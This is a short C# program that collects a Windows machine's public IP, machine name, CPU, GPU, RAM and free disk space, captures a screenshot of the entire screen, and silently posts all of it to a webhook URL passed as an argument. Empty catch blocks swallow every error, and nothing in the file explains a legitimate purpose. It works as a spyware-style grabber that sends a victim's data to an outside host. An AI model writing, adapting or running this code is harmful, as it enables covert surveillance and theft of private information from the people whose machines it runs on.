using System;
using System.Net.Http;
using System.Text;
using System.Management;
using System.Collections.Generic;
using System.Drawing;
using System.Drawing.Imaging;
using System.Windows.Forms;
using System.IO;

public class Program
{
    public static void Main(string[] args)
    {
        try {
            string webhook = args[0];
            var client = new HttpClient();

            string ip = "N/A";
            try { ip = client.GetStringAsync("https://ifconfig.me/ip").GetAwaiter().GetResult().Trim(); } catch {}
            
            string pcName = Environment.MachineName;
            string cpu = "";
            using (var s = new ManagementObjectSearcher("select Name from Win32_Processor"))
                foreach (var obj in s.Get()) cpu = obj["Name"].ToString();

            var gpus = new List<string>();
            using (var s = new ManagementObjectSearcher("select Name from Win32_VideoController"))
                foreach (var obj in s.Get()) gpus.Add(obj["Name"].ToString());
            string gpuList = string.Join(", ", gpus);

            long mem = 0;
            using (var s = new ManagementObjectSearcher("select Capacity from Win32_PhysicalMemory"))
                foreach (var obj in s.Get()) mem += Convert.ToInt64(obj["Capacity"]);
            int ram = (int)(mem / 1024 / 1024 / 1024);

            var drive = new System.IO.DriveInfo("C");
            long disk = drive.AvailableFreeSpace / 1024 / 1024 / 1024;

            string report = "**REPORT: " + pcName + "**\n---\n**IP:** " + ip + "\n**CPU:** " + cpu + "\n**GPU:** " + gpuList + "\n**RAM:** " + ram + "GB\n**Disk C:** " + disk + "GB volných";

            Rectangle bounds = Screen.PrimaryScreen.Bounds;
            using (Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height))
            {
                using (Graphics g = Graphics.FromImage(bitmap))
                {
                    g.CopyFromScreen(Point.Empty, Point.Empty, bounds.Size);
                }

                using (MemoryStream ms = new MemoryStream())
                {
                    bitmap.Save(ms, ImageFormat.Png);
                    byte[] byteImage = ms.ToArray();

                    using (var form = new MultipartFormDataContent())
                    {
                        form.Add(new StringContent(report, Encoding.UTF8), "content");
                        var imageContent = new ByteArrayContent(byteImage);
                        imageContent.Headers.ContentType = new System.Net.Http.Headers.MediaTypeHeaderValue("image/png");
                        form.Add(imageContent, "file", "screenshot.png");

                        client.PostAsync(webhook, form).GetAwaiter().GetResult();
                    }
                }
            }
        }
        catch { }
    }
}
